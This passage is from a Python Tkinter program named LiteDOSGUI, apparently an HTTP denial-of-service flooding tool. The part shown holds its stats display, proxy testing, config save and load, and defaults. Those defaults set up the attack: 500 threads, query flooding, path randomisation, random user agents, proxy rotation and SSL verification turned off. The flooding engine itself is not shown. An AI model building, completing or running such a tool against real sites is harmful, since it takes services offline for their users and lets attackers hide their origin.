        self.log(f"Total Responses: {snapshot['responses_received']}")
        self.log(f"Total Errors: {snapshot['errors']}")
        self.log(f"Peak RPS: {snapshot['peak_rps']}")
        self.log(f"Data Sent: {snapshot['bytes_sent_mb']} MB")
        self.log("=" * 60)
    
    def update_stats_loop(self):
        if not self.stats.running:
            return
        
        snapshot = self.stats.snapshot()
        
        self.stats_labels["req_sent"].config(text=str(snapshot["requests_sent"]))
        self.stats_labels["resp_recv"].config(text=str(snapshot["responses_received"]))
        self.stats_labels["errors"].config(text=str(snapshot["errors"]))
        self.stats_labels["rps_avg"].config(text=str(snapshot["rps"]))
        self.stats_labels["rps_cur"].config(text=str(snapshot["current_rps"]))
        self.stats_labels["peak_rps"].config(text=str(snapshot["peak_rps"]))
        self.stats_labels["data_sent"].config(text=str(snapshot["bytes_sent_mb"]))
        self.stats_labels["data_recv"].config(text=str(snapshot["bytes_recv_mb"]))
        self.stats_labels["elapsed"].config(text=f"{snapshot['elapsed']}s")
        
        status_str = ", ".join(f"{k}: {v}" for k, v in snapshot["status_codes"].items())
        self.stats_labels["status"].config(text=status_str[:50] if status_str else "None")
        
        self.update_job = self.root.after(100, self.update_stats_loop)
    
    def test_proxies(self):
        proxies = [p.strip() for p in self.proxy_text.get(1.0, tk.END).strip().split('\n') if p.strip()]
        if not proxies:
            messagebox.showinfo("No Proxies", "Add some proxies first, Boss.")
            return
        
        self.log(f"[PROXY TEST] Testing {len(proxies)} proxies...")
        
        def test():
            working = 0
            for proxy in proxies:
                try:
                    import requests
                    proxies_dict = {"http": proxy, "https": proxy} if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")) else {"http": proxy, "https": proxy}
                    r = requests.get("http://httpbin.org/ip", proxies=proxies_dict, timeout=5)
                    if r.status_code == 200:
                        working += 1
                        self.log(f"[PROXY OK] {proxy}")
                    else:
                        self.log(f"[PROXY FAIL] {proxy} — Status {r.status_code}")
                except Exception as e:
                    self.log(f"[PROXY FAIL] {proxy} — {str(e)[:40]}")
            
            self.log(f"[PROXY TEST] Done. {working}/{len(proxies)} working.")
        
        threading.Thread(target=test, daemon=True).start()
    
    def save_config(self):
        path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if path:
            cfg = self.get_config_from_ui()
            with open(path, 'w') as f:
                json.dump(asdict(cfg), f, indent=2)
            self.log(f"Config saved to {path}")
    
    def load_config(self):
        path = filedialog.askopenfilename(filetypes=[("JSON files", "*.json")])
        if path and os.path.exists(path):
            with open(path, 'r') as f:
                data = json.load(f)
            
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, data.get("target", ""))
            self.threads_var.set(data.get("threads", 500))
            self.duration_var.set(data.get("duration", 60))
            self.timeout_var.set(data.get("timeout", 10))
            self.method_var.set(data.get("method", "GET"))
            self.async_var.set(data.get("use_async", True))
            self.ramp_var.set(data.get("ramp_up", False))
            self.ua_var.set(data.get("random_ua", True))
            self.payload_var.set(data.get("random_payload", False))
            self.keepalive_var.set(data.get("keep_alive", True))
            self.redirect_var.set(data.get("follow_redirects", False))
            self.ssl_var.set(data.get("ssl_verify", False))
            self.delay_var.set(data.get("delay", 0.0))
            self.payload_size_var.set(data.get("payload_size", 0))
            self.path_var.set(data.get("path_randomize", False))
            self.query_var.set(data.get("query_flood", False))
            self.cookie_var.set(data.get("cookie_jar", True))
            self.pool_var.set(data.get("connection_pool", 100))
            
            if data.get("proxy_list"):
                self.proxy_text.delete(1.0, tk.END)
                self.proxy_text.insert(tk.END, '\n'.join(data["proxy_list"]))
                self.use_proxy_var.set(True)
            
            if data.get("custom_headers"):
                self.headers_text.delete(1.0, tk.END)
                self.headers_text.insert(tk.END, json.dumps(data["custom_headers"], indent=2))
            
            self.log(f"Config loaded from {path}")
    
    def reset_defaults(self):
        self.target_entry.delete(0, tk.END)
        self.target_entry.insert(0, "https://example.com")
        self.threads_var.set(500)
        self.duration_var.set(60)
        self.timeout_var.set(10)
        self.method_var.set("GET")
        self.async_var.set(True)
        self.ramp_var.set(False)
        self.ua_var.set(True)
        self.payload_var.set(False)
        self.keepalive_var.set(True)
        self.redirect_var.set(False)
        self.ssl_var.set(False)
        self.delay_var.set(0.0)
        self.payload_size_var.set(0)
        self.path_var.set(False)
        self.query_var.set(False)
        self.cookie_var.set(True)
        self.pool_var.set(100)
        self.proxy_text.delete(1.0, tk.END)
        self.use_proxy_var.set(False)
        self.headers_text.delete(1.0, tk.END)
        self.headers_text.insert(tk.END, '{\n  "X-Custom-Header": "value"\n}')
        self.ua_text.delete(1.0, tk.END)
        for ua in DEFAULT_UAS[:5]:
            self.ua_text.insert(tk.END, ua + "\n")
        self.log("Defaults restored.")
    
    def run(self):
        self.root.mainloop()

# ==================== ENTRY POINT ====================

def check_dependencies():
    missing = []
    try:
        import aiohttp
    except ImportError:
        missing.append("aiohttp")
    try:
        import requests
    except ImportError:
        missing.append("requests")
    
    if missing:
        print(f"[!] Missing dependencies: {', '.join(missing)}")
        print("[*] Install with: pip install " + " ".join(missing))
        input("Press Enter to exit...")
        sys.exit(1)

if __name__ == "__main__":
    check_dependencies()
    app = LiteDOSGUI()
    app.run()

